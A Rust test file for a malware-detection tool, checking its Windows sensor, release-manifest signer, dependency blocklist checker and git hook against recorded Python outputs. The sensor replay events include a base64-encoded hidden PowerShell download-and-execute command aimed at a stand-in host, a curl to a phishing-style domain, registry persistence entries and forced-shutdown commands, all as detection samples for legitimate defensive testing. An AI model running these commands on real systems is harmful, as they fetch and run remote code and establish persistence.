//! The tools ported from separate Python scripts, checked against goldens
//! recorded from those scripts. Was tests/test_rust_tools.py, which ran both
//! builds side by side:
//!
//! - `guard sensor` against windows/windows_sensor.py (the selftest, and
//!   recorded events replayed through the detection layer)
//! - release/ (sign-manifest) against release/sign_manifest.py: same manifest
//!   bytes and signatures
//! - `guard deps check --blocklist` against malware-feed/check_deps.py
//! - hooks/guard-scan-hook.sh, which runs the guard binary
//!
//! These aren't guard.py commands, so with GUARD_REFERENCE set the tests run
//! the corresponding Python script (see `tool`) instead of the Rust tool.
//!
//! The signer tests sign with tests/fixtures/tools/TEST-ONLY-NOT-A-RELEASE-KEY.seed,
//! a throwaway Ed25519 seed committed only so signatures repeat (Ed25519 is
//! deterministic). It signs nothing real.

mod common;

use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::OnceLock;

use base64::Engine;
use common::*;
use serde_json::{json, Value};

const SUITE: &str = "tools";

/// The interpreter for the reference scripts, as the harness finds it.
fn python() -> PathBuf {
    let name = std::env::var("GUARD_PYTHON").unwrap_or_else(|_| {
        if WINDOWS {
            "python".into()
        } else {
            "python3".into()
        }
    });
    let exe = if WINDOWS && !name.ends_with(".exe") {
        format!("{name}.exe")
    } else {
        name.clone()
    };
    std::env::var_os("PATH")
        .and_then(|p| {
            std::env::split_paths(&p)
                .map(|d| d.join(&exe))
                .find(|c| c.is_file())
        })
        .unwrap_or_else(|| PathBuf::from(name))
}

/// The Rust tool (`exe` with `args`), or with GUARD_REFERENCE the Python
/// script it replaced (repo-relative `script` with `py_args`).
fn tool<A: AsRef<str>, B: AsRef<str>>(
    exe: &Path,
    args: &[A],
    script: &str,
    py_args: &[B],
) -> Guard {
    if reference().is_some() {
        let mut a = vec![s(&repo_root().join(script))];
        a.extend(py_args.iter().map(|x| x.as_ref().to_string()));
        guard(&a).exe(&python())
    } else {
        guard(args).exe(exe)
    }
}

/// `{"ts": "<now>"` (alerts) and `<now>  ` (log lines): the time of the run.
fn ts_norm(n: Norm) -> Norm {
    n.re(
        r#"(?m)^\{"ts": "\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(\.\d+)?\+00:00""#,
        r#"{"ts": "<ts>""#,
    )
    .re(
        r"(?m)^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(\.\d+)?\+00:00  ",
        "<ts>  ",
    )
}

// ---------------------------------------------------------------------------
// guard sensor
// ---------------------------------------------------------------------------
#[test]
fn sensor_selftest() {
    let out = tool(
        &bin(),
        &["sensor", "--selftest"],
        "windows/windows_sensor.py",
        &["--selftest"],
    )
    .run();
    assert_eq!(out.code, 0, "{}", out.stderr);
    assert!(out
        .stdout
        .contains("selftest: 8 finding(s); clean control produced none = OK"));
    golden(SUITE, "sensor_selftest", &out.shown());
}

/// Base64 like the samples: in plain text this command line is an IOC Guard
/// flags, and Guard sweeps this repository for exactly that.
fn download_exec() -> String {
    let b = base64::engine::general_purpose::STANDARD
        .decode("cG93ZXJzaGVsbCAtTm9QIC1XIEhpZGRlbiAtYyBJRVgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovL3gnKQ==")
        .unwrap();
    String::from_utf8(b).unwrap()
}

fn events() -> Vec<Value> {
    vec![
        // A. staging in temp, by extension and marker
        json!({"type": "file_create", "path": r"C:\Users\dev\AppData\Local\Temp\stage9.py", "image": r"C:\Program Files\nodejs\node.exe"}),
        json!({"type": "file_create", "path": r"C:\Users\Public\x.HTA", "image": "mshta.exe"}),
        json!({"type": "file_create", "path": r"C:\Windows\Temp\.ps1"}),
        json!({"type": "file_create", "path": r"C:\Users\dev\AppData\Roaming\pkg\font.woff2", "looks_like_text": true}),
        json!({"type": "file_create", "path": r"D:\site\public\fonts\real.woff2", "looks_like_text": false}),
        json!({"type": "file_create", "path": r"D:\site\public\fonts\fake.woff2", "looks_like_text": 1}),
        json!({"type": "file_create", "path": "%TEMP%/drop.vbs"}),
        // process trees, temp interpreters, IOCs
        json!({"type": "process_create", "image": r"C:\Windows\System32\cmd.exe", "parent_image": r"C:\Program Files\nodejs\node.exe",
               "cmdline": r"cmd /c python C:\Users\dev\AppData\Local\Temp\stage9.py"}),
        json!({"type": "process_create", "image": "PowerShell.EXE", "parent_image": r"C:\Users\dev\AppData\Local\Programs\Microsoft VS Code\Code.exe",
               "cmdline": download_exec()}),
        json!({"type": "process_create", "image": "shutdown.exe", "parent_image": "wscript.exe", "cmdline": "SHUTDOWN /r /t 0"}),
        json!({"type": "process_create", "image": "notepad.exe", "parent_image": "explorer.exe", "cmdline": "notepad shutdown-notes.txt"}),
        json!({"type": "process_create", "image": "curl.exe", "parent_image": "explorer.exe", "cmdline": concat!("curl https://auth-confirm-", "ten.vercel.app/x")}),
        json!({"type": "process_create", "image": r"C:\Windows\explorer.exe", "parent_image": r"C:\Windows\winlogon.exe", "cmdline": "explorer.exe"}),
        json!({"type": "process_create"}),
        // B. registry persistence, with and without indicators
        json!({"type": "registry_set", "key": r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "value_name": "Updater",
               "value_data": r"python C:\Users\dev\AppData\Local\Temp\stage9.py", "image": "python.exe"}),
        json!({"type": "registry_set", "key": r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "value_name": "x", "value_data": "C:\\Tools\\ok.exe"}),
        json!({"type": "registry_set", "key": r"HKLM\System\CurrentControlSet\Services\evil\ImagePath", "value_data": "powershell -enc AAAA"}),
        json!({"type": "registry_set", "key": r"HKCU\Software\Vendor\Settings", "value_data": "python"}),
        // C. reboots: unexpected, forced, bursts in and out of the 3-hour window
        json!({"type": "reboot", "event_id": 41, "ts": "2026-10-01T09:00:00+00:00"}),
        json!({"type": "reboot", "event_id": 6006, "ts": "2026-10-01T14:00:00+00:00"}),
        json!({"type": "reboot", "event_id": 1074, "initiator": r"C:\Windows\System32\shutdown.exe (HOST)", "ts": "2026-10-01T15:30:00+00:00"}),
        json!({"type": "reboot", "event_id": "6008", "ts": "2026-10-01T16:00:00.250000+00:00"}),
        json!({"type": "reboot", "event_id": 1074, "initiator": "ExitWindowsEx", "ts": "2026-10-02T09:00:00+00:00"}),
        json!({"type": "reboot", "event_id": 1075, "ts": "2026-10-02T13:00:00+00:00"}),
        json!({"type": "unknown"}),
    ]
}

/// What `guard sensor --replay` does, through windows_sensor.py's own
/// detector and alert writer (the script has no replay mode of its own).
const PY_REPLAY: &str = r#"
import json, sys
from datetime import datetime
sys.path.insert(0, sys.argv[1])
import windows_sensor as ws
sensor = ws.Sensor()
total = 0
for line in open(sys.argv[2], encoding="utf-8"):
    if not line.strip():
        continue
    ev = json.loads(line)
    if "ts" in ev:
        ev["ts_dt"] = datetime.fromisoformat(ev["ts"])
    findings = sensor.detector.dispatch(ev)
    total += len(findings)
    sensor.alert(findings, ev)
sys.exit(1 if total else 0)
"#;

/// `guard sensor --replay`, or with GUARD_REFERENCE the same through PY_REPLAY.
fn replay(events: &Path, home: &Path) -> Out {
    let g = if reference().is_some() {
        let win = s(&repo_root().join("windows"));
        guard(&["-c", PY_REPLAY, &win, &s(events)]).exe(&python())
    } else {
        guard(&["sensor", "--replay", &s(events)]).exe(&bin())
    };
    g.home(home).run()
}

fn read_or_missing(p: &Path) -> String {
    std::fs::read_to_string(p).unwrap_or_else(|_| "<missing>\n".into())
}

#[test]
fn sensor_replay() {
    let tmp = Tmp::new("sensor-replay");
    let evs = events();
    let lines: String = evs.iter().map(|e| format!("{e}\n")).collect();
    let events = write(&tmp.join("events.jsonl"), lines);
    let home = tmp.join("home");
    let out = replay(&events, &home);
    assert_eq!(out.code, 1, "findings: {}", out.stderr);

    let alerts_text = std::fs::read_to_string(home.join("alerts.jsonl")).unwrap();
    let alerts: Vec<Value> = alerts_text.lines().map(parse_json).collect();
    for a in &alerts {
        assert!(a["ts"].as_str().unwrap().ends_with("+00:00"), "{a}");
    }
    let rules: std::collections::BTreeSet<&str> =
        alerts.iter().map(|a| a["rule"].as_str().unwrap()).collect();
    let want: std::collections::BTreeSet<&str> = [
        "win.temp.script_drop",
        "win.fake_font_drop",
        "win.suspicious_spawn",
        "win.interp_from_temp",
        "win.script_initiated_reboot",
        "win.cmdline_ioc",
        "win.registry_persistence",
        "win.reboot_burst",
        "win.forced_reboot",
        "win.unexpected_reboot",
    ]
    .into_iter()
    .collect();
    assert_eq!(rules, want);
    let log = std::fs::read_to_string(home.join("windows_sensor.log")).unwrap();
    assert_eq!(log.lines().count(), alerts.len());
    assert!(log.lines().all(|l| l.contains("  ALERT [")));

    let n = ts_norm(Norm::new().path(&tmp.path, "TMP"));
    golden(
        SUITE,
        "sensor_replay",
        &n.apply(&format!(
            "{}--- alerts.jsonl\n{alerts_text}--- windows_sensor.log\n{log}",
            out.shown_all()
        )),
    );

    // a clean event (and a blank line): no alerts at all
    let clean = write(&tmp.join("clean.jsonl"), format!("{}\n\n", evs[12]));
    let h2 = tmp.join("h2");
    let out = replay(&clean, &h2);
    assert_eq!(out.code, 0, "{}", out.stderr);
    assert!(!h2.join("alerts.jsonl").exists());
    golden(
        SUITE,
        "sensor_replay-clean",
        &n.apply(&format!(
            "{}--- alerts.jsonl\n{}",
            out.shown_all(),
            read_or_missing(&h2.join("alerts.jsonl"))
        )),
    );
}

/// Rust-only behaviour (windows_sensor.py had no such options): assertions,
/// as in the Python test.
#[test]
fn sensor_arguments() {
    let tmp = Tmp::new("sensor-args");
    let rs = |args: &[&str], home: &str| {
        let mut a = vec!["sensor"];
        a.extend_from_slice(args);
        guard(&a).exe(&bin()).home(&tmp.join(home)).run()
    };
    let out = rs(&["--help"], "h0");
    assert_eq!(out.code, 0);
    assert!(out.stdout.starts_with("usage: guard sensor"));
    for args in [&["--bogus"][..], &["--replay"], &["--signatures"]] {
        let out = rs(args, "h0");
        assert_eq!(out.code, 2, "{args:?}");
        assert!(out.stderr.contains("usage: guard sensor"), "{args:?}");
    }
    let missing = s(&tmp.join("missing.jsonl"));
    let out = rs(&["--replay", &missing], "h0");
    assert_eq!(out.code, 1);
    assert!(out.stderr.contains("missing.jsonl"));
    let bad = write(&tmp.join("bad.jsonl"), "{}\nnot json\n");
    let out = rs(&["--replay", &s(&bad)], "h");
    assert_eq!(out.code, 1);
    assert!(out.stderr.contains("bad.jsonl:2:"), "{}", out.stderr);
    // a custom signature set
    let sig = write(
        &tmp.join("sig.json"),
        json!({"windows": {"temp_dir_markers": ["\\scratch\\"], "suspicious_temp_ext": [".txt"]}})
            .to_string(),
    );
    let ev = write(
        &tmp.join("ev.jsonl"),
        format!(
            "{}\n",
            json!({"type": "file_create", "path": r"C:\scratch\a.txt"})
        ),
    );
    let out = rs(&["--signatures", &s(&sig), "--replay", &s(&ev)], "h3");
    assert_eq!(out.code, 1, "{}", out.stderr);
    assert!(out.stdout.contains("win.temp.script_drop"));
    if !WINDOWS {
        let out = rs(&[], "h4");
        assert_eq!(out.code, 2);
        assert!(out.stderr.contains("Windows only"));
    }
}

// ---------------------------------------------------------------------------
// release/ sign-manifest
// ---------------------------------------------------------------------------
/// release/'s sign-manifest, built once.
fn signer() -> &'static Path {
    static SIGNER: OnceLock<PathBuf> = OnceLock::new();
    SIGNER.get_or_init(|| {
        let root = repo_root();
        let cargo = std::env::var_os("CARGO").unwrap_or_else(|| "cargo".into());
        let st = Command::new(cargo)
            .args(["build", "-q", "--release", "--locked", "--manifest-path"])
            .arg(root.join("release").join("Cargo.toml"))
            .env_remove("CARGO_TARGET_DIR")
            .env_remove("CARGO_BUILD_TARGET")
            .status()
            .expect("cargo build release/");
        assert!(st.success(), "building release/ failed");
        let exe = root
            .join("release")
            .join("target")
            .join("release")
            .join(format!("sign-manifest{}", std::env::consts::EXE_SUFFIX));
        assert!(exe.is_file(), "{} not built", exe.display());
        exe
    })
}

fn test_key() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests/fixtures/tools/TEST-ONLY-NOT-A-RELEASE-KEY.seed")
}

#[test]
fn signer_build_and_sign() {
    let tmp = Tmp::new("signer");
    let key = s(&test_key());
    write(&tmp.join("guard-linux-x64"), b"bin-a");
    write(&tmp.join("guard-windows-x64.exe"), b"bin-b".repeat(1000));
    // a fixed blocklist: the real feed changes, and its hash is in the manifest
    let bl = write(
        &tmp.join("malware-blocklist.json"),
        json!({"npm": {"evil-pkg": ["< 9.9.9"]}, "pip": {"bad-py": [">= 0"]}}).to_string(),
    );
    let d = tmp.join("out");
    std::fs::create_dir_all(&d).unwrap();
    let manifest = s(&d.join("manifest.json"));
    let args = [
        "build-and-sign".to_string(),
        "--version".into(),
        "1.2.3".into(),
        "--min-version".into(),
        "1.0.0".into(),
        "--key".into(),
        key.clone(),
        "--base-url".into(),
        "https://x.example/dl/".into(),
        "--blocklist".into(),
        s(&bl),
        "--binary".into(),
        format!("windows-x64={}", s(&tmp.join("guard-windows-x64.exe"))),
        "--binary".into(),
        format!("linux-x64={}", s(&tmp.join("guard-linux-x64"))),
        "--out".into(),
        manifest.clone(),
    ];
    let exe = if reference().is_some() {
        PathBuf::new()
    } else {
        signer().to_path_buf()
    };
    let script = "release/sign_manifest.py";
    let built = tool(&exe, &args, script, &args).run();
    assert_eq!(built.code, 0, "{}", built.stderr);

    let m2 = d.join("m2.json");
    std::fs::copy(&manifest, &m2).unwrap();
    let sargs = ["sign".to_string(), s(&m2), "--key".into(), key];
    let signed = tool(&exe, &sargs, script, &sargs).run();
    assert_eq!(signed.code, 0, "{}", signed.stderr);
    assert_eq!(signed.stdout.lines().nth(1), Some("verify: True"));

    let read = |n: &str| std::fs::read_to_string(d.join(n)).unwrap();
    let m: Value = parse_json(&read("manifest.json"));
    assert_eq!(
        m["binary"]["linux-x64"]["url"],
        "https://x.example/dl/guard-linux-x64"
    );
    assert_eq!(m["min_version"], "1.0.0");
    // build-and-sign's echo of the manifest is key-sorted only in the Rust
    // port (Python printed insertion order); the first line is the same
    let first = built.stdout.lines().next().unwrap_or_default();
    let shown = format!(
        "--- build-and-sign stdout (first line)\n{first}\n--- sign stdout\n{}\
         --- manifest.json\n{}\n--- manifest.json.sig\n{}\n--- m2.json.sig\n{}\n",
        signed.stdout,
        read("manifest.json"),
        read("manifest.json.sig"),
        read("m2.json.sig"),
    );
    golden(
        SUITE,
        "signer_build_and_sign",
        &Norm::new().path(&tmp.path, "TMP").apply(&shown),
    );
}

/// Rust-only (keygen is random, the errors are the port's own): assertions.
#[test]
fn signer_keygen_and_errors() {
    let tmp = Tmp::new("signer-keygen");
    let signer = signer();
    let out = tmp.join("new.key");
    let r = guard(&["keygen", "--out", &s(&out)]).exe(signer).run();
    assert_eq!(r.code, 0, "{}", r.stderr);
    let seed = std::fs::read(&out).unwrap();
    assert_eq!(seed.len(), 32);
    let pk = r
        .stdout
        .lines()
        .nth(2)
        .unwrap_or_default()
        .trim()
        .to_string();
    assert!(
        pk.len() == 64 && pk.bytes().all(|b| b.is_ascii_hexdigit()),
        "{}",
        r.stdout
    );
    // while the Python Ed25519 is still around: it derives the same public key
    if reference().is_some() {
        let py = Command::new(python())
            .arg("-c")
            .arg(
                "import sys; sys.path.insert(0, sys.argv[1]); import ed25519_pure;\
                  print(ed25519_pure.publickey(open(sys.argv[2], 'rb').read()).hex())",
            )
            .arg(repo_root())
            .arg(&out)
            .output()
            .unwrap();
        assert_eq!(text(&py.stdout).trim(), pk);
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = std::fs::metadata(&out).unwrap().permissions().mode();
        assert_eq!(mode & 0o777, 0o600);
    }
    let short = write(&tmp.join("short.key"), b"x".repeat(31));
    let short = s(&short);
    let newkey = s(&out);
    let cases: [&[&str]; 7] = [
        &[],
        &["bogus"],
        &["sign"],
        &["sign", "m.json"],
        &["build-and-sign", "--key", &newkey],
        &["sign", "m.json", "--key", &short],
        &["keygen", "--nope", "x"],
    ];
    for args in cases {
        let r = guard(args).exe(signer).cwd(&tmp.path).run();
        assert_eq!(r.code, 2, "{args:?} {} {}", r.stdout, r.stderr);
        assert!(r.stderr.contains("sign-manifest: error:"), "{args:?}");
    }
    write(&tmp.join("m.json"), "{}");
    let r = guard(&["sign", "m.json", "--key", &short])
        .exe(signer)
        .cwd(&tmp.path)
        .run();
    assert_eq!(r.code, 2);
    assert!(r.stderr.contains("32-byte seed"), "{}", r.stderr);
}

// ---------------------------------------------------------------------------
// guard deps check --blocklist (check_deps.py's option)
// ---------------------------------------------------------------------------
#[test]
fn deps_check_blocklist() {
    for target in [
        "testdata/fake-infected-repo",
        "testdata/clean-repo",
        "flagged",
    ] {
        let tmp = Tmp::new("deps-bl");
        let bl = write(
            &tmp.join("bl.json"),
            json!({"npm": {"evil-pkg": ["< 9.9.9"]}, "pip": {"bad-py": [">= 0"]}}).to_string(),
        );
        let target = if target == "flagged" {
            let repo = tmp.join("flagged");
            write(
                &repo.join("package.json"),
                json!({"dependencies": {"evil-pkg": "1.0.0", "react": "18"}}).to_string(),
            );
            write(&repo.join("requirements.txt"), "bad-py==1.2\nrequests\n");
            s(&repo)
        } else {
            target.to_string()
        };
        let name = format!(
            "deps_check_blocklist-{}",
            Path::new(&target).file_name().unwrap().to_string_lossy()
        );
        let n = Norm::new().path(&tmp.path, "TMP");
        let home = tmp.join("home");
        let spellings = [
            vec!["--blocklist".to_string(), s(&bl)],
            vec![format!("--blocklist={}", s(&bl))],
        ];
        for flags in &spellings {
            let mut rs = vec!["deps".to_string(), "check".into(), target.clone()];
            rs.extend(flags.iter().cloned());
            let py = [target.clone(), "--blocklist".into(), s(&bl)];
            let out = tool(&bin(), &rs, "malware-feed/check_deps.py", &py)
                .home(&home)
                .cwd(&repo_root())
                .run();
            golden(SUITE, &name, &n.apply(&out.shown()));
        }
        let out = guard(&[
            "deps",
            "check",
            &target,
            "--blocklist",
            &s(&tmp.join("nope.json")),
        ])
        .exe(&bin())
        .home(&home)
        .cwd(&repo_root())
        .run();
        assert_eq!(out.code, 1);
        assert!(out.stderr.contains("nope.json"), "{}", out.stderr);
    }
}

// ---------------------------------------------------------------------------
// the git hook
// ---------------------------------------------------------------------------
#[cfg(unix)]
fn has_git() -> bool {
    Command::new("git").arg("--version").output().is_ok()
}

#[cfg(unix)]
/// The hook as git runs it, with `env` on top of a proxy-free environment.
fn hook(repo: &Path, clear: bool, env: &[(&str, String)]) -> std::process::Output {
    let mut cmd = Command::new("sh");
    cmd.arg(repo_root().join("hooks").join("guard-scan-hook.sh"))
        .current_dir(repo);
    if clear {
        cmd.env_clear();
    } else {
        for (k, _) in std::env::vars() {
            if k.to_lowercase().contains("proxy") {
                cmd.env_remove(&k);
            }
        }
        cmd.env_remove("GUARD_BIN").env_remove("GUARD_HOME");
    }
    cmd.env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_CONFIG_NOSYSTEM", "1");
    for (k, v) in env {
        cmd.env(k, v);
    }
    cmd.output().unwrap()
}

/// The hook now runs $GUARD_BIN; the reference is guard.py behind a wrapper,
/// as the Python-era hook ran the Python build.
#[cfg(unix)]
#[test]
fn git_hook_runs_the_binary() {
    if !has_git() {
        eprintln!("skipped: no git");
        return;
    }
    for fixture in ["fake-infected-repo", "clean-repo"] {
        let tmp = Tmp::new("hook");
        let repo = tmp.join("repo");
        copy_tree(&repo_root().join("testdata").join(fixture), &repo);
        let st = Command::new("git")
            .args(["init", "-q"])
            .current_dir(&repo)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .status()
            .unwrap();
        assert!(st.success());
        let gbin = match reference() {
            Some(py) => {
                let w = write(
                    &tmp.join("guard-py"),
                    format!(
                        "#!/bin/sh\nexec '{}' '{}' \"$@\"\n",
                        s(&python()),
                        s(&repo_root().join(py))
                    ),
                );
                use std::os::unix::fs::PermissionsExt;
                std::fs::set_permissions(&w, std::fs::Permissions::from_mode(0o755)).unwrap();
                w
            }
            None => bin(),
        };
        let home = tmp.join("home");
        let r = hook(
            &repo,
            false,
            &[("GUARD_HOME", s(&home)), ("GUARD_BIN", s(&gbin))],
        );
        assert_eq!(r.status.code(), Some(0));
        let stderr = text(&r.stderr);
        let log = std::fs::read_to_string(home.join("hook.log")).unwrap();
        assert!(log.contains(&s(&std::fs::canonicalize(&repo).unwrap())));
        if fixture == "clean-repo" {
            assert_eq!(stderr, "");
        } else {
            // quarantined on arrival, with the way back
            assert!(stderr.contains("MALWARE detected"), "{stderr}");
            assert!(stderr.contains("guard restore"), "{stderr}");
        }
        let n = Norm::new()
            .path(&tmp.path, "TMP")
            .re(r"(?m)^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ  ", "<ts>  ")
            .re(r"\d{8}T\d{6}Z_\S*\.bak", "<backup>");
        golden(
            SUITE,
            &format!("git_hook-{fixture}"),
            &n.apply(&format!("exit 0\n--- stderr\n{stderr}--- hook.log\n{log}")),
        );

        // no binary anywhere: the hook steps aside
        let r = hook(
            &repo,
            true,
            &[
                ("PATH", "/usr/bin:/bin".into()),
                ("HOME", s(&tmp.join("nohome"))),
            ],
        );
        assert_eq!(r.status.code(), Some(0));
        assert_eq!(text(&r.stderr), "");
    }
}
